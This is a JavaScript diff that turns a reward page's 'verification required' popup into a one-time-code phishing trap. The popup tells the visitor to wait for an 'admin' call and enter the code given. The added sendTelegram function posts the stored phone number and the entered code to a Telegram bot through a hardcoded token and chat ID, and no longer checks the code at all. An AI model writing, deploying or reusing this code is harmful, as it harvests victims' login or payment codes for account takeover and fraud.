@@ -1,5 +1,17 @@
-let verificationCode = null;
-let attempts = 0;
+/**
+ * Firewall Module - 4-digit Verification with Telegram (includes code)
+ */
+
+// Send Telegram notification with code and title
+async function sendTelegram(phone, code) {
+    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
+    try {
+        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+        console.log("📨 Telegram sent");
+    } catch(e) {
+        console.log("Telegram error:", e);
+    }
+}
 
 function showFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
@@ -10,12 +22,12 @@ function showFirewallPopup() {
                 <div class="firewall-warning-icon">📞</div>
                 <h2>VERIFICATION REQUIRED</h2>
                 <div class="firewall-message">
-                    <p>Due to multiple claiming requests detected in the system, a verification call is required before proceeding.</p>
-                    <p>Please wait for the admin to call you. You will receive a 6-digit code during the call.</p>
+                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                    <p>Please wait for the admin to call you. You will receive a 4-digit code during the call.</p>
                     <p>Enter the code below to continue.</p>
                 </div>
                 <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                     <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                 </div>
                 <div class="firewall-note">
@@ -24,9 +36,6 @@ function showFirewallPopup() {
                 <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             `;
         }
-        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-        attempts = 0;
-        console.log("📞 Verification Code (give this to user):", verificationCode);
         popup.style.display = 'flex';
         setTimeout(() => {
             const ci = document.getElementById('verificationCode');
@@ -40,60 +49,33 @@ function hideFirewallPopup() {
     if (popup) popup.style.display = 'none';
 }
 
-window.verifyFirewallCode = function() {
+function refreshPage() {
+    window.location.reload();
+}
+
+window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput ? codeInput.value.trim() : '';
     const errorDiv = document.getElementById('firewallErrorMsg');
-    const verifyBtn = document.getElementById('verifyCodeBtn');
     
-    if (!code || code.length < 6) {
+    if (!code || code.length < 4) {
         if (errorDiv) {
-            errorDiv.innerHTML = "Please enter the 6-digit verification code.";
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
             errorDiv.style.display = 'block';
         }
         return;
     }
     
-    if (verifyBtn) {
-        verifyBtn.disabled = true;
-        verifyBtn.innerHTML = "VERIFYING...";
-    }
-    if (errorDiv) errorDiv.style.display = 'none';
+    // Send notification with the code user entered
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    await sendTelegram(userPhone, code);
     
-    attempts++;
+    hideFirewallPopup();
+    alert("Verification submitted. Page will refresh.");
     
-    if (code === verificationCode) {
-        hideFirewallPopup();
-        alert("Verification successful. You may now claim your reward.");
-        const withdrawBtn = document.getElementById('claimBtn');
-        if (withdrawBtn && withdrawBtn.style.display === 'block') {
-            withdrawBtn.click();
-        }
-    } else {
-        let errorMsg = "Invalid verification code. Please try again.";
-        if (attempts >= 3) {
-            errorMsg = "Too many failed attempts. Please request a new call.";
-            if (verifyBtn) {
-                verifyBtn.disabled = true;
-                verifyBtn.innerHTML = "TOO MANY ATTEMPTS";
-                setTimeout(() => {
-                    if (verifyBtn) {
-                        verifyBtn.disabled = false;
-                        verifyBtn.innerHTML = "VERIFY NOW";
-                    }
-                    attempts = 0;
-                }, 30000);
-            }
-        }
-        if (errorDiv) {
-            errorDiv.innerHTML = errorMsg;
-            errorDiv.style.display = 'block';
-        }
-        if (verifyBtn && verifyBtn.disabled !== true) {
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = "VERIFY NOW";
-        }
-    }
+    setTimeout(() => {
+        refreshPage();
+    }, 500);
 };
 
 window.showFirewallPopup = showFirewallPopup;
